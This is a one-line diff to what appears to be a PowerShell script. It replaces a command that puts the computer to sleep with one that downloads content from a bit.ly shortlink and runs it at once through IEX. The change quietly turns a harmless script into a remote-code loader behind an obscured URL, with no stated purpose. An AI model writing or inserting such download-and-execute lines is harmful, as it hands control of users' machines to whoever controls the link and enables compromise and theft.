@@ -1,1 +1,1 @@
-Invoke-Expression "rundll32.exe powrprof.dll,SetSuspendState Sleep"
+IEX (Invoke-WebRequest -Uri "bit.ly/curroneBox" -UseBasicParsing).Content
